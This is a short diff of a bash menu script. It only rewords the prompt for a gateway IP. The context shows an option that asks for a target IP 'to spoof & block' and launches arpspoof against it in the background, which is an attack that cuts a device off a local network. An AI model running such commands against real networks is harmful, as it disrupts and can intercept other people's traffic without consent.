@@ -84,7 +84,7 @@ while true; do
             ;;
         6)
             read -p "Enter interface (e.g. wlan0): " iface
-            read -p "Enter your gateway IP (usually 192.168.x.1): " gw
+            read -p "Enter your gateway IP (router ip 192.168.x.x): " gw
             read -p "Enter target IP to spoof & block: " target_ip
             echo "[*] Starting ARP spoofing..."
             sudo arpspoof -i $iface -t $target_ip $gw &
